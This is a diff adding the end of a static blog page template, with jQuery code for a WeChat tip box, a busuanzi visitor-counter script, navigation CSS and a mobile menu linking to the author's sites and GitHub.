+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_self"   href="http://DeelMind.com/">DeelMind</a>
+    
+    
+    <a class="dynamic-menu " target="_self"   href="http://sunwu.world/">子夜旅馆</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="http://pan.sunwu.world/">子夜旅馆的网盘</a>
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/sunwu57">github</a>
+    
+</div>
+
+
+</html>
